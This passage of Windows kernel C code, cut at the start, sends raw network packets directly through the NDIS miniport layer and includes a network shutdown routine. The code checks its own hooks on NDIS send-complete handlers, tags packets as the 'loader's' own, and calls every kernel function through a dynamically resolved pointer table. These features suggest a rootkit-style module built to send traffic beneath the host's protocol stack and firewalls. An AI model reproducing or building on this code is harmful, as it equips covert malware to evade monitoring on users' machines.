                pGlobalBlock->pNetworkBlock->fnNdisFreeMemory(pData, 0, 0);
                err = ERR_MEM;
                FnKdPrint(("LoaderSendPacketFromStack: failed with FnNdis5AllocateBuffer\n"));
                break;
            }

            pGlobalBlock->pNetworkBlock->fnNdisAllocatePacket(&ndisStatus, &Packet, pAdapter->packetPoolHandle);

            if (ndisStatus != NDIS_STATUS_SUCCESS) {
                pGlobalBlock->pNetworkBlock->fnNdisFreeMemory(pData, 0, 0);
                ndisFreeBuffer(Buffer);
                err = ERR_MEM;
                FnKdPrint(("LoaderSendPacketFromStack: failed with FnNdis5AllocatePacket\n"));
                break;
            }

            FnNdis5ChainBufferAtFront(Packet, Buffer);

            pSendRsvd = (PSEND_RSVD)(Packet->ProtocolReserved);
            pSendRsvd->tag = LOADER_SELF_PKT;
            pSendRsvd->pSourceHandle = pAdapter->pMiniBlock;
            pSendRsvd->originalPacket = (uint8_t*)Packet;
            pSendRsvd->pNext = NULL;

            for (pHookContext = pAdapter->pHookContext; pHookContext != NULL; pHookContext = pHookContext->pNext) {
                if (pHookContext->pHookFunc == pGlobalBlock->pNetworkBlock->fnHookNdis5_SendCompleteHandler)
                    break;
            }

            if (pHookContext != NULL && *pHookContext->ppOriginFunc == pHookContext && !pGlobalBlock->pNetworkBlock->needReconfigure && !pAdapter->miniportPaused) {
                pGlobalBlock->pNetworkBlock->fnNdisMiniportSendPackets(pAdapter->pSendHandle, &Packet, 1);

                if (pGlobalBlock->osMajorVersion > 5 && pAdapter->flags & NDIS_FLAGS_DESERIALIZED) {
                    ndisStatus = NDIS_GET_PACKET_STATUS(Packet);
                    if (ndisStatus != NDIS_STATUS_SUCCESS && ndisStatus != NDIS_STATUS_PENDING) {
                        FnKdPrint(("BAD PACKET STATUS: %d\n", ndisStatus));

                        if (ndisStatus == NDIS_STATUS_RESOURCES) {
                            ndisFreeBuffer(Buffer);
                            pGlobalBlock->pNetworkBlock->fnNdisFreeMemory(pData, 0, 0);
                            pGlobalBlock->pNetworkBlock->fnNdisFreePacket(Packet);
                        }

                        err = ERR_IF;
                    }
                }
            }
            else {
                ndisFreeBuffer(Buffer);
                pGlobalBlock->pNetworkBlock->fnNdisFreeMemory(pData, 0, 0);
                pGlobalBlock->pNetworkBlock->fnNdisFreePacket(Packet);
                err = ERR_IF;
            }
        }
        else {
            PMDL pMdl;
            PNET_BUFFER_LIST pNetBufferLists;

            pMdl = pGlobalBlock->pNetworkBlock->fnNdisAllocateMdl(pAdapter->pMiniBlock, pData, len);

            if (pMdl == NULL) {
                pGlobalBlock->pNetworkBlock->fnNdisFreeMemory(pData, 0, 0);
                err = ERR_MEM;
                break;
            } 
  
            pNetBufferLists = pGlobalBlock->pNetworkBlock->fnNdisAllocateNetBufferAndNetBufferList(pAdapter->nbPoolHandle, sizeof(SEND_RSVD), 0, pMdl, 0, len);

            if (pNetBufferLists == NULL) {
                pGlobalBlock->pNetworkBlock->fnNdisFreeMdl(pMdl);
                pGlobalBlock->pNetworkBlock->fnNdisFreeMemory(pData, 0, 0);
                err = ERR_MEM;
                break;
            }

            pNetBufferLists->SourceHandle = pAdapter->SourceHandle;

            pSendRsvd = (PSEND_RSVD)NET_BUFFER_LIST_CONTEXT_DATA_START(pNetBufferLists);
            pSendRsvd->tag = LOADER_SELF_PKT;
            pSendRsvd->pSourceHandle = pAdapter->SourceHandle;
            pSendRsvd->originalPacket = (uint8_t*)pNetBufferLists;
            pSendRsvd->pNext = NULL;

            for (pHookContext = pAdapter->pHookContext; pHookContext != NULL; pHookContext = pHookContext->pNext) {
                if (pHookContext->pHookFunc == pGlobalBlock->pNetworkBlock->fnHookNdis6_MSendNetBufferListsComplete) {
                    break;
                }
            }

            if (pHookContext != NULL && *pHookContext->ppOriginFunc == pHookContext && !pGlobalBlock->pNetworkBlock->needReconfigure && !pAdapter->miniportPaused) {
                pGlobalBlock->pNetworkBlock->fnNdisSendNetBufferLists(pAdapter->pSendHandle, pNetBufferLists, NDIS_DEFAULT_PORT_NUMBER, 0);

                ndisStatus = NET_BUFFER_LIST_STATUS(pNetBufferLists);
                if (ndisStatus != NDIS_STATUS_SUCCESS && ndisStatus != NDIS_STATUS_PENDING) {
                    FnKdPrint(("BAD PACKET STATUS: %d\n", ndisStatus));

                    if (ndisStatus == NDIS_STATUS_RESOURCES) {
                        pGlobalBlock->pNetworkBlock->fnNdisFreeNetBufferList(pNetBufferLists);
                        pGlobalBlock->pNetworkBlock->fnNdisFreeMdl(pMdl);
                        pGlobalBlock->pNetworkBlock->fnNdisFreeMemory(pData, 0, 0);
                    }

                    err = ERR_IF;
                }
            }
            else {
                pGlobalBlock->pNetworkBlock->fnNdisFreeNetBufferList(pNetBufferLists);
                pGlobalBlock->pNetworkBlock->fnNdisFreeMdl(pMdl);
                pGlobalBlock->pNetworkBlock->fnNdisFreeMemory(pData, 0, 0);
                err = ERR_IF;
            }
        }        
    } while(FALSE);

    return err;
}

void network_shutdown_routine()
{
    uint32_t i;
    USE_GLOBAL_BLOCK

    pGlobalBlock->pNetworkBlock->fnnetwork_destroy_all_adapters();

    pGlobalBlock->pCommonBlock->fnExFreePoolWithTag(pGlobalBlock->pNetworkBlock->pInPacketBuffer, LOADER_TAG);

    for (i = 0; i < 4; ++i) {
        pGlobalBlock->pCommonBlock->fnExFreePoolWithTag(pGlobalBlock->pNetworkBlock->netParams[i], LOADER_TAG);
    }

    pGlobalBlock->pCommonBlock->fnExFreePoolWithTag(pGlobalBlock->pNetworkBlock, LOADER_TAG);
}
